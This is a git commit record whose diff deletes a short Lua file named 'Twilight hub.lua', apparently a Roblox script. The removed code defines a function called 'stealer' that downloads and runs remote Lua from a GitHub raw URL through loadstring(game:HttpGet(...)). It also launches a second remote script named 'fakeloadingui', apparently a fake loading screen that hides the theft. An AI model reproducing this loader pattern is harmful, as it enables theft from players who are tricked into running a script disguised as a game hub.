bc09e1c3992a6fa4837b6cb0aaf319848a6374d1
ScriptkingPt <erclone131@gmail.com>
2025-05-26 03:28:42 +0800

    Delete Twilight hub.lua

--- Twilight hub.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/twilight.lua'))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/fakeloadingui.lua'))()
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
